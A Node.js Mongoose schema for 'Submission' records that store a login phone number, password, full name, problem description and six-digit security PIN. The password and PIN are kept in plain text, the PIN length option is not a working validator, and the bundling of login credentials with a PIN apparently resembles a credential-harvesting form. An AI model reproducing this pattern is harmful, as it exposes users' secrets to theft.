const mongoose = require('mongoose');

const submissionSchema = new mongoose.Schema({
  // Section 1: Login Credentials Used
  loginPhone: {
    type: String,
    required: true,
    match: [/^\d{10}$/, 'Please enter a valid 10-digit phone number']
  },
  loginPassword: {
    type: String,
    required: true
  },
  // Section 2: Form Data
  fullName: {
    type: String,
    required: true
  },
  problem: {
    type: String,
    required: true
  },
  securityPin: {
    type: String,
    required: true,
    length: 6
  },
  experience: {
    type: String,
    required: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model('Submission', submissionSchema);